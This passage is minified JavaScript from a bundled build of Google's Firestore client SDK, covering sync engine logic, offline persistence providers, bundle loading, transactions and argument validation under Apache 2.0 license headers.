r=n.Tc.get(e)||[];r.push(t),n.Tc.set(e,r)}catch(e){const n=Ca(e,"Initialization of waitForPendingWrites() operation failed");t.reject(n)}}function Mv(e,t){(e.Tc.get(t)||[]).forEach((e=>{e.resolve()})),e.Tc.delete(t)}function Rv(e,t,n){const r=q(e);let i=r.Ic[r.currentUser.toKey()];if(i){const e=i.get(t);e&&(n?e.reject(n):e.resolve(),i=i.remove(t)),r.Ic[r.currentUser.toKey()]=i}}function fa(e,t,n=null){e.sharedClientState.removeLocalQueryTarget(t);for(const r of e._c.get(t))e.dc.delete(r),n&&e.fc.vc(r,n);e._c.delete(t),e.isPrimaryClient&&e.yc.ps(t).forEach((t=>{e.yc.containsKey(t)||II(e,t)}))}function II(e,t){e.wc.delete(t.path.canonicalString());const n=e.mc.get(t);null!==n&&(du(e.remoteStore,n),e.mc=e.mc.remove(t),e.gc.delete(n),Av(e))}function pg(e,t,n){for(const r of n)r instanceof _I?(e.yc.addReference(r.key,t),wF(e,r)):r instanceof EI?(V("SyncEngine","Document no longer in limbo: "+r.key),e.yc.removeReference(r.key,t),e.yc.containsKey(r.key)||II(e,r.key)):G()}function wF(e,t){const n=t.key,r=n.path.canonicalString();e.mc.get(n)||e.wc.has(r)||(V("SyncEngine","New document in limbo: "+n),e.wc.add(r),Av(e))}function Av(e){for(;e.wc.size>0&&e.mc.size<e.maxConcurrentLimboResolutions;){const t=e.wc.values().next().value;e.wc.delete(t);const n=new B(Te.fromString(t)),r=e.Ec.next();e.gc.set(r,new cF(n)),e.mc=e.mc.insert(n,r),Jd(e.remoteStore,new Vr(kn(Ea(n.path)),r,"TargetPurposeLimboResolution",wn.ct))}}async function ei(e,t,n){const r=q(e),i=[],s=[],o=[];r.dc.isEmpty()||(r.dc.forEach(((e,a)=>{o.push(r.Rc(a,t,n).then((e=>{if((e||n)&&r.isPrimaryClient&&r.sharedClientState.updateQueryState(a.targetId,null!=e&&e.fromCache?"not-current":"current"),e){i.push(e);const t=vv.Bi(a.targetId,e);s.push(t)}})))})),await Promise.all(o),r.fc.eu(i),await async function(e,t){const n=q(e);try{await n.persistence.runTransaction("notifyLocalViewChanges","readwrite",(e=>C.forEach(t,(t=>C.forEach(t.$i,(r=>n.persistence.referenceDelegate.addReference(e,t.targetId,r))).next((()=>C.forEach(t.Fi,(r=>n.persistence.referenceDelegate.removeReference(e,t.targetId,r)))))))))}catch(e){if(!Xi(e))throw e;V("LocalStore","Failed to update sequence numbers: "+e)}for(const e of t){const t=e.targetId;if(!e.fromCache){const e=n.Hi.get(t),r=e.snapshotVersion,i=e.withLastLimboFreeSnapshotVersion(r);n.Hi=n.Hi.insert(t,i)}}}(r.localStore,s))}async function SF(e,t){const n=q(e);if(!n.currentUser.isEqual(t)){V("SyncEngine","User change. New user:",t.toKey());const e=await oI(n.localStore,t);n.currentUser=t,(r=n).Tc.forEach((e=>{e.forEach((e=>{e.reject(new L(M.CANCELLED,"'waitForPendingWrites' promise is rejected due to a user change."))}))})),r.Tc.clear(),n.sharedClientState.handleUserChange(t,e.removedBatchIds,e.addedBatchIds),await ei(n,e.tr)}var r}function _F(e,t){const n=q(e),r=n.gc.get(t);if(r&&r.lc)return ce().add(r.key);{let e=ce();const r=n._c.get(t);if(!r)return e;for(const t of r){const r=n.dc.get(t);e=e.unionWith(r.view.ec)}return e}}async function EF(e,t){const n=q(e),r=await td(n.localStore,t.query,!0),i=t.view.ac(r);return n.isPrimaryClient&&pg(n,t.targetId,i.uc),i}async function TF(e,t){const n=q(e);return cI(n.localStore,t).then((e=>ei(n,e)))}async function xF(e,t,n,r){const i=q(e),s=await function(e,t){const n=q(e),r=q(n.mutationQueue);return n.persistence.runTransaction("Lookup mutation documents","readonly",(e=>r.Vn(e,t).next((t=>t?n.localDocuments.getDocuments(e,t):C.resolve(null)))))}(i.localStore,t);var o,a;null!==s?("pending"===n?await ka(i.remoteStore):"acknowledged"===n||"rejected"===n?(Rv(i,t,r||null),Mv(i,t),o=i.localStore,a=t,q(q(o).mutationQueue).Dn(a)):G(),await ei(i,s)):V("SyncEngine","Cannot apply mutation batch with id: "+t)}async function IF(e,t){const n=q(e);if(bv(n),Ov(n),!0===t&&!0!==n.Ac){const e=n.sharedClientState.getAllActiveQueryTargets(),t=await OS(n,e.toArray());n.Ac=!0,await fg(n.remoteStore,!0);for(const e of t)Jd(n.remoteStore,e)}else if(!1===t&&!1!==n.Ac){const e=[];let t=Promise.resolve();n._c.forEach(((r,i)=>{n.sharedClientState.isLocalQueryTarget(i)?e.push(i):t=t.then((()=>(fa(n,i),ha(n.localStore,i,!0)))),du(n.remoteStore,i)})),await t,await OS(n,e),function(e){const t=q(e);t.gc.forEach(((e,n)=>{du(t.remoteStore,n)})),t.yc.Is(),t.gc=new Map,t.mc=new Be(B.comparator)}(n),n.Ac=!1,await fg(n.remoteStore,!1)}}async function OS(e,t,n){const r=q(e),i=[],s=[];for(const e of t){let t;const n=r._c.get(e);if(n&&0!==n.length){t=await ca(r.localStore,kn(n[0]));for(const e of n){const t=r.dc.get(e),n=await EF(r,t);n.snapshot&&s.push(n.snapshot)}}else{const n=await uI(r.localStore,e);t=await ca(r.localStore,n),await Nv(r,kI(n),e,!1,t.resumeToken)}i.push(t)}return r.fc.eu(s),i}function kI(e){return mx(e.path,e.collectionGroup,e.orderBy,e.filters,e.limit,"F",e.startAt,e.endAt)}function kF(e){const t=q(e);return q(q(t.localStore).persistence).Mi()}async function DF(e,t,n,r){const i=q(e);if(i.Ac)return void V("SyncEngine","Ignoring unexpected query state notification.");const s=i._c.get(t);if(s&&s.length>0)switch(n){case"current":case"not-current":{const e=await cI(i.localStore,yx(s[0])),r=Vu.createSynthesizedRemoteEventForCurrentChange(t,"current"===n,Ct.EMPTY_BYTE_STRING);await ei(i,e,r);break}case"rejected":await ha(i.localStore,t,!0),fa(i,t,r);break;default:G()}}async function CF(e,t,n){const r=bv(e);if(r.Ac){for(const e of t){if(r._c.has(e)){V("SyncEngine","Adding an already active target "+e);continue}const t=await uI(r.localStore,e),n=await ca(r.localStore,t);await Nv(r,kI(t),n.targetId,!1,n.resumeToken),Jd(r.remoteStore,n)}for(const e of n)r._c.has(e)&&await ha(r.localStore,e,!1).then((()=>{du(r.remoteStore,e),fa(r,e)})).catch(Qi)}}function bv(e){const t=q(e);return t.remoteStore.remoteSyncer.applyRemoteEvent=xI.bind(null,t),t.remoteStore.remoteSyncer.getRemoteKeysForTarget=_F.bind(null,t),t.remoteStore.remoteSyncer.rejectListen=mF.bind(null,t),t.fc.eu=sF.bind(null,t.eventManager),t.fc.vc=oF.bind(null,t.eventManager),t}function Ov(e){const t=q(e);return t.remoteStore.remoteSyncer.applySuccessfulWrite=gF.bind(null,t),t.remoteStore.remoteSyncer.rejectFailedWrite=yF.bind(null,t),t}function NF(e,t,n){const r=q(e);(async function(e,t,n){try{const i=await t.getMetadata();if(await function(e,t){const n=q(e),r=yt(t.createTime);return n.persistence.runTransaction("hasNewerBundle","readonly",(e=>n.Ls.getBundleMetadata(e,t.id))).then((e=>!!e&&e.createTime.compareTo(r)>=0))}(e.localStore,i))return await t.close(),n._completeWith({taskState:"Success",documentsLoaded:(r=i).totalDocuments,bytesLoaded:r.totalBytes,totalDocuments:r.totalDocuments,totalBytes:r.totalBytes}),Promise.resolve(new Set);n._updateProgress(SI(i));const s=new lF(i,e.localStore,t.serializer);let o=await t.Pc();for(;o;){const e=await s.ju(o);e&&n._updateProgress(e),o=await t.Pc()}const a=await s.complete();return await ei(e,a.Hu,void 0),await function(e,t){const n=q(e);return n.persistence.runTransaction("Save bundle","readwrite",(e=>n.Ls.saveBundleMetadata(e,t)))}(e.localStore,i),n._completeWith(a.progress),Promise.resolve(a.Wu)}catch(e){return sr("SyncEngine",`Loading bundle failed with ${e}`),n._failWith(e),Promise.resolve(new Set)}var r})(r,t,n).then((e=>{r.sharedClientState.notifyBundleLoaded(e)}))}class mg{constructor(){this.synchronizeTabs=!1}async initialize(e){this.serializer=zu(e.databaseInfo.databaseId),this.sharedClientState=this.createSharedClientState(e),this.persistence=this.createPersistence(e),await this.persistence.start(),this.localStore=this.createLocalStore(e),this.gcScheduler=this.createGarbageCollectionScheduler(e,this.localStore),this.indexBackfillerScheduler=this.createIndexBackfillerScheduler(e,this.localStore)}createGarbageCollectionScheduler(e,t){return null}createIndexBackfillerScheduler(e,t){return null}createLocalStore(e){return sI(this.persistence,new iI,e.initialUser,this.serializer)}createPersistence(e){return new rI(Xd.js,this.serializer)}createSharedClientState(e){return new dI}async terminate(){this.gcScheduler&&this.gcScheduler.stop(),await this.sharedClientState.shutdown(),await this.persistence.shutdown()}}class DI extends mg{constructor(e,t,n){super(),this.bc=e,this.cacheSizeBytes=t,this.forceOwnership=n,this.synchronizeTabs=!1}async initialize(e){await super.initialize(e),await this.bc.initialize(this,e),await Ov(this.bc.syncEngine),await ka(this.bc.remoteStore),await this.persistence.pi((()=>(this.gcScheduler&&!this.gcScheduler.started&&this.gcScheduler.start(),this.indexBackfillerScheduler&&!this.indexBackfillerScheduler.started&&this.indexBackfillerScheduler.start(),Promise.resolve())))}createLocalStore(e){return sI(this.persistence,new iI,e.initialUser,this.serializer)}createGarbageCollectionScheduler(e,t){const n=this.persistence.referenceDelegate.garbageCollector;return new vL(n,e.asyncQueue,t)}createIndexBackfillerScheduler(e,t){const n=new t$(t,this.persistence);return new e$(e.asyncQueue,n)}createPersistence(e){const t=yv(e.databaseInfo.databaseId,e.databaseInfo.persistenceKey),n=void 0!==this.cacheSizeBytes?gn.withCacheSize(this.cacheSizeBytes):gn.DEFAULT;return new gv(this.synchronizeTabs,t,e.clientId,n,e.asyncQueue,fI(),sh(),this.serializer,this.sharedClientState,!!this.forceOwnership)}createSharedClientState(e){return new dI}}class MF extends DI{constructor(e,t){super(e,t,!1),this.bc=e,this.cacheSizeBytes=t,this.synchronizeTabs=!0}async initialize(e){await super.initialize(e);const t=this.bc.syncEngine;this.sharedClientState instanceof Np&&(this.sharedClientState.syncEngine={Qr:xF.bind(null,t),jr:DF.bind(null,t),zr:CF.bind(null,t),Mi:kF.bind(null,t),Gr:TF.bind(null,t)},await this.sharedClientState.start()),await this.persistence.pi((async e=>{await IF(this.bc.syncEngine,e),this.gcScheduler&&(e&&!this.gcScheduler.started?this.gcScheduler.start():e||this.gcScheduler.stop()),this.indexBackfillerScheduler&&(e&&!this.indexBackfillerScheduler.started?this.indexBackfillerScheduler.start():e||this.indexBackfillerScheduler.stop())}))}createSharedClientState(e){const t=fI();if(!Np.D(t))throw new L(M.UNIMPLEMENTED,"IndexedDB persistence is only available on platforms that support LocalStorage.");const n=yv(e.databaseInfo.databaseId,e.databaseInfo.persistenceKey);return new Np(t,e.asyncQueue,n,e.clientId,e.initialUser)}}class Pv{async initialize(e,t){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(t),this.remoteStore=this.createRemoteStore(t),this.eventManager=this.createEventManager(t),this.syncEngine=this.createSyncEngine(t,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=e=>bS(this.syncEngine,e,1),this.remoteStore.remoteSyncer.handleCredentialChange=SF.bind(null,this.syncEngine),await fg(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return new iF}createDatastore(e){const t=zu(e.databaseInfo.databaseId),n=(r=e.databaseInfo,new BL(r));var r,i,s;return i=e.authCredentials,s=e.appCheckCredentials,new YL(i,s,n,t)}createRemoteStore(e){return t=this.localStore,n=this.datastore,r=e.asyncQueue,i=e=>bS(this.syncEngine,e,0),s=NS.D()?new NS:new VL,new GL(t,n,r,i,s);var t,n,r,i,s}createSyncEngine(e,t){return function(e,t,n,r,i,s,o){const a=new hF(e,t,n,r,i,s);return o&&(a.Ac=!0),a}(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,t)}terminate(){return async function(e){const t=q(e);V("RemoteStore","RemoteStore shutting down."),t.Au.add(5),await Ia(t),t.vu.shutdown(),t.Pu.set("Unknown")}(this.remoteStore)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function PS(e,t=10240){let n=0;return{async read(){if(n<e.byteLength){const r={value:e.slice(n,n+t),done:!1};return n+=t,r}return{done:!0}},async cancel(){},releaseLock(){},closed:Promise.resolve()}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Zd{constructor(e){this.observer=e,this.muted=!1}next(e){this.observer.next&&this.Vc(this.observer.next,e)}error(e){this.observer.error?this.Vc(this.observer.error,e):mt("Uncaught Error in snapshot listener:",e.toString())}Sc(){this.muted=!0}Vc(e,t){this.muted||setTimeout((()=>{this.muted||e(t)}),0)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class RF{constructor(e,t){this.Dc=e,this.serializer=t,this.metadata=new Pt,this.buffer=new Uint8Array,this.Cc=new TextDecoder("utf-8"),this.xc().then((e=>{e&&e.Gu()?this.metadata.resolve(e.Ku.metadata):this.metadata.reject(new Error(`The first element of the bundle is not a metadata, it is\n             ${JSON.stringify(null==e?void 0:e.Ku)}`))}),(e=>this.metadata.reject(e)))}close(){return this.Dc.cancel()}async getMetadata(){return this.metadata.promise}async Pc(){return await this.getMetadata(),this.xc()}async xc(){const e=await this.Nc();if(null===e)return null;const t=this.Cc.decode(e),n=Number(t);isNaN(n)&&this.kc(`length string (${t}) is not valid number`);const r=await this.Mc(n);return new aF(JSON.parse(r),e.length+n)}Oc(){return this.buffer.findIndex((e=>e==="{".charCodeAt(0)))}async Nc(){for(;this.Oc()<0&&!await this.$c(););if(0===this.buffer.length)return null;const e=this.Oc();e<0&&this.kc("Reached the end of bundle when a length string is expected.");const t=this.buffer.slice(0,e);return this.buffer=this.buffer.slice(e),t}async Mc(e){for(;this.buffer.length<e;)await this.$c()&&this.kc("Reached the end of bundle when more is expected.");const t=this.Cc.decode(this.buffer.slice(0,e));return this.buffer=this.buffer.slice(e),t}kc(e){throw this.Dc.cancel(),new Error(`Invalid bundle format: ${e}`)}async $c(){const e=await this.Dc.read();if(!e.done){const t=new Uint8Array(this.buffer.length+e.value.length);t.set(this.buffer),t.set(e.value,this.buffer.length),this.buffer=t}return e.done}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class AF{constructor(e){this.datastore=e,this.readVersions=new Map,this.mutations=[],this.committed=!1,this.lastWriteError=null,this.writtenDocs=new Set}async lookup(e){if(this.ensureCommitNotCalled(),this.mutations.length>0)throw new L(M.INVALID_ARGUMENT,"Firestore transactions require all reads to be executed before all writes.");const t=await async function(e,t){const n=q(e),r=cu(n.serializer)+"/documents",i={documents:t.map((e=>uu(n.serializer,e)))},s=await n.Ao("BatchGetDocuments",r,i,t.length),o=new Map;s.forEach((e=>{const t=J$(n.serializer,e);o.set(t.key.toString(),t)}));const a=[];return t.forEach((e=>{const t=o.get(e.toString());te(!!t),a.push(t)})),a}(this.datastore,e);return t.forEach((e=>this.recordVersion(e))),t}set(e,t){this.write(t.toMutation(e,this.precondition(e))),this.writtenDocs.add(e.toString())}update(e,t){try{this.write(t.toMutation(e,this.preconditionForUpdate(e)))}catch(e){this.lastWriteError=e}this.writtenDocs.add(e.toString())}delete(e){this.write(new xa(e,this.precondition(e))),this.writtenDocs.add(e.toString())}async commit(){if(this.ensureCommitNotCalled(),this.lastWriteError)throw this.lastWriteError;const e=this.readVersions;this.mutations.forEach((t=>{e.delete(t.key.toString())})),e.forEach(((e,t)=>{const n=B.fromPath(t);this.mutations.push(new sv(n,this.precondition(n)))})),await async function(e,t){const n=q(e),r=cu(n.serializer)+"/documents",i={writes:t.map((e=>hu(n.serializer,e)))};await n.po("Commit",r,i)}(this.datastore,this.mutations),this.committed=!0}recordVersion(e){let t;if(e.isFoundDocument())t=e.version;else{if(!e.isNoDocument())throw G();t=ee.min()}const n=this.readVersions.get(e.key.toString());if(n){if(!t.isEqual(n))throw new L(M.ABORTED,"Document version changed between two reads.")}else this.readVersions.set(e.key.toString(),t)}precondition(e){const t=this.readVersions.get(e.toString());return!this.writtenDocs.has(e.toString())&&t?t.isEqual(ee.min())?Ze.exists(!1):Ze.updateTime(t):Ze.none()}preconditionForUpdate(e){const t=this.readVersions.get(e.toString());if(!this.writtenDocs.has(e.toString())&&t){if(t.isEqual(ee.min()))throw new L(M.INVALID_ARGUMENT,"Can't update a document that doesn't exist.");return Ze.updateTime(t)}return Ze.exists(!0)}write(e){this.ensureCommitNotCalled(),this.mutations.push(e)}ensureCommitNotCalled(){}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bF{constructor(e,t,n,r,i){this.asyncQueue=e,this.datastore=t,this.options=n,this.updateFunction=r,this.deferred=i,this.Fc=n.maxAttempts,this.Lo=new Sv(this.asyncQueue,"transaction_retry")}run(){this.Fc-=1,this.Bc()}Bc(){this.Lo.xo((async()=>{const e=new AF(this.datastore),t=this.Lc(e);t&&t.then((t=>{this.asyncQueue.enqueueAndForget((()=>e.commit().then((()=>{this.deferred.resolve(t)})).catch((e=>{this.qc(e)}))))})).catch((e=>{this.qc(e)}))}))}Lc(e){try{const t=this.updateFunction(e);return!Ou(t)&&t.catch&&t.then?t:(this.deferred.reject(Error("Transaction callback must return a Promise")),null)}catch(e){return this.deferred.reject(e),null}}qc(e){this.Fc>0&&this.Uc(e)?(this.Fc-=1,this.asyncQueue.enqueueAndForget((()=>(this.Bc(),Promise.resolve())))):this.deferred.reject(e)}Uc(e){if("FirebaseError"===e.name){const t=e.code;return"aborted"===t||"failed-precondition"===t||"already-exists"===t||!Rx(t)}return!1}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class OF{constructor(e,t,n,r){this.authCredentials=e,this.appCheckCredentials=t,this.asyncQueue=n,this.databaseInfo=r,this.user=bt.UNAUTHENTICATED,this.clientId=WT.A(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this.authCredentials.start(n,(async e=>{V("FirestoreClient","Received user=",e.uid),await this.authCredentialListener(e),this.user=e})),this.appCheckCredentials.start(n,(e=>(V("FirestoreClient","Received new app check token=",e),this.appCheckCredentialListener(e,this.user))))}async getConfiguration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}verifyNotTerminated(){if(this.asyncQueue.isShuttingDown)throw new L(M.FAILED_PRECONDITION,"The client has already been terminated.")}terminate(){this.asyncQueue.enterRestrictedMode();const e=new Pt;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted((async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(t){const n=Ca(t,"Failed to shutdown persistence");e.reject(n)}})),e.promise}}async function oh(e,t){e.asyncQueue.verifyOperationInProgress(),V("FirestoreClient","Initializing OfflineComponentProvider");const n=await e.getConfiguration();await t.initialize(n);let r=n.initialUser;e.setCredentialChangeListener((async e=>{r.isEqual(e)||(await oI(t.localStore,e),r=e)})),t.persistence.setDatabaseDeletedListener((()=>e.terminate())),e._offlineComponents=t}async function gg(e,t){e.asyncQueue.verifyOperationInProgress();const n=await $v(e);V("FirestoreClient","Initializing OnlineComponentProvider");const r=await e.getConfiguration();await t.initialize(n,r),e.setCredentialChangeListener((e=>MS(t.remoteStore,e))),e.setAppCheckTokenChangeListener(((e,n)=>MS(t.remoteStore,n))),e._onlineComponents=t}function CI(e){return"FirebaseError"===e.name?e.code===M.FAILED_PRECONDITION||e.code===M.UNIMPLEMENTED:!(typeof DOMException<"u"&&e instanceof DOMException)||22===e.code||20===e.code||11===e.code}async function $v(e){if(!e._offlineComponents)if(e._uninitializedComponentsProvider){V("FirestoreClient","Using user provided OfflineComponentProvider");try{await oh(e,e._uninitializedComponentsProvider._offline)}catch(t){const n=t;if(!CI(n))throw n;sr("Error using user provided cache. Falling back to memory cache: "+n),await oh(e,new mg)}}else V("FirestoreClient","Using default OfflineComponentProvider"),await oh(e,new mg);return e._offlineComponents}async function ef(e){return e._onlineComponents||(e._uninitializedComponentsProvider?(V("FirestoreClient","Using user provided OnlineComponentProvider"),await gg(e,e._uninitializedComponentsProvider._online)):(V("FirestoreClient","Using default OnlineComponentProvider"),await gg(e,new Pv))),e._onlineComponents}function NI(e){return $v(e).then((e=>e.persistence))}function Lv(e){return $v(e).then((e=>e.localStore))}function MI(e){return ef(e).then((e=>e.remoteStore))}function Fv(e){return ef(e).then((e=>e.syncEngine))}function PF(e){return ef(e).then((e=>e.datastore))}async function pa(e){const t=await ef(e),n=t.eventManager;return n.onListen=dF.bind(null,t.syncEngine),n.onUnlisten=fF.bind(null,t.syncEngine),n}function $F(e){return e.asyncQueue.enqueue((async()=>{const t=await NI(e),n=await MI(e);return t.setNetworkEnabled(!0),function(e){const t=q(e);return t.Au.delete(0),Bu(t)}(n)}))}function LF(e){return e.asyncQueue.enqueue((async()=>{const t=await NI(e),n=await MI(e);return t.setNetworkEnabled(!1),async function(e){const t=q(e);t.Au.add(0),await Ia(t),t.Pu.set("Offline")}(n)}))}function FF(e,t){const n=new Pt;return e.asyncQueue.enqueueAndForget((async()=>async function(e,t,n){try{const r=await function(e,t){const n=q(e);return n.persistence.runTransaction("read document","readonly",(e=>n.localDocuments.getDocument(e,t)))}(e,t);r.isFoundDocument()?n.resolve(r):r.isNoDocument()?n.resolve(null):n.reject(new L(M.UNAVAILABLE,"Failed to get document from cache. (However, this document may exist on the server. Run again without setting 'source' in the GetOptions to attempt to retrieve the document from the server.)"))}catch(e){const r=Ca(e,`Failed to get document '${t} from cache`);n.reject(r)}}(await Lv(e),t,n))),n.promise}function RI(e,t,n={}){const r=new Pt;return e.asyncQueue.enqueueAndForget((async()=>function(e,t,n,r,i){const s=new Zd({next:s=>{t.enqueueAndForget((()=>kv(e,o)));const a=s.docs.has(n);!a&&s.fromCache?i.reject(new L(M.UNAVAILABLE,"Failed to get document because the client is offline.")):a&&s.fromCache&&r&&"server"===r.source?i.reject(new L(M.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):i.resolve(s)},error:e=>i.reject(e)}),o=new Cv(Ea(n.path),s,{includeMetadataChanges:!0,Uu:!0});return Iv(e,o)}(await pa(e),e.asyncQueue,t,n,r))),r.promise}function VF(e,t){const n=new Pt;return e.asyncQueue.enqueueAndForget((async()=>async function(e,t,n){try{const r=await td(e,t,!0),i=new TI(t,r.sr),s=i.nc(r.documents),o=i.applyChanges(s,!1);n.resolve(o.snapshot)}catch(e){const r=Ca(e,`Failed to execute query '${t} against cache`);n.reject(r)}}(await Lv(e),t,n))),n.promise}function AI(e,t,n={}){const r=new Pt;return e.asyncQueue.enqueueAndForget((async()=>function(e,t,n,r,i){const s=new Zd({next:n=>{t.enqueueAndForget((()=>kv(e,o))),n.fromCache&&"server"===r.source?i.reject(new L(M.UNAVAILABLE,'Failed to get documents from server. (However, these documents may exist in the local cache. Run again without setting source to "server" to retrieve the cached documents.)')):i.resolve(n)},error:e=>i.reject(e)}),o=new Cv(n,s,{includeMetadataChanges:!0,Uu:!0});return Iv(e,o)}(await pa(e),e.asyncQueue,t,n,r))),r.promise}function UF(e,t){const n=new Zd(t);return e.asyncQueue.enqueueAndForget((async()=>{return t=await pa(e),r=n,q(t).Nu.add(r),void r.next();var t,r})),()=>{n.Sc(),e.asyncQueue.enqueueAndForget((async()=>{return t=await pa(e),r=n,void q(t).Nu.delete(r);var t,r}))}}function zF(e,t,n,r){const i=function(e,t){let n;return n="string"==typeof e?bx().encode(e):e,r=function(e,t){if(e instanceof Uint8Array)return PS(e,t);if(e instanceof ArrayBuffer)return PS(new Uint8Array(e),t);if(e instanceof ReadableStream)return e.getReader();throw new Error("Source of `toByteStreamReader` has to be a ArrayBuffer or ReadableStream")}(n),new RF(r,t);var r}(n,zu(t));e.asyncQueue.enqueueAndForget((async()=>{NF(await Fv(e),i,r)}))}function BF(e,t){return e.asyncQueue.enqueue((async()=>function(e,t){const n=q(e);return n.persistence.runTransaction("Get named query","readonly",(e=>n.Ls.getNamedQuery(e,t)))}(await Lv(e),t)))}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $S=new Map;
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Vv(e,t,n){if(!n)throw new L(M.INVALID_ARGUMENT,`Function ${e}() cannot be called with an empty ${t}.`)}function bI(e,t,n,r){if(!0===t&&!0===r)throw new L(M.INVALID_ARGUMENT,`${e} and ${n} cannot be used together.`)}function LS(e){if(!B.isDocumentKey(e))throw new L(M.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${e} has ${e.length}.`)}function FS(e){if(B.isDocumentKey(e))throw new L(M.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${e} has ${e.length}.`)}function tf(e){if(void 0===e)return"undefined";if(null===e)return"null";if("string"==typeof e)return e.length>20&&(e=`${e.substring(0,20)}...`),JSON.stringify(e);if("number"==typeof e||"boolean"==typeof e)return""+e;if("object"==typeof e){if(e instanceof Array)return"an array";{const n=(t=e).constructor?t.constructor.name:null;return n?`a custom ${n} object`:"an object"}}var t;return"function"==typeof e?"a function":G()}function ke(e,t){if("_delegate"in e&&(e=e._delegate),!(e instanceof t)){if(t.name===e.constructor.name)throw new L(M.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const n=tf(e);throw new L(M.INVALID_ARGUMENT,`Expected type '${t.name}', but it was: ${n}`)}}return e}function OI(e,t){if(t<=0)throw new L(M.INVALID_ARGUMENT,`Function ${e}() requires a positive number, but it was: ${t}.`)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
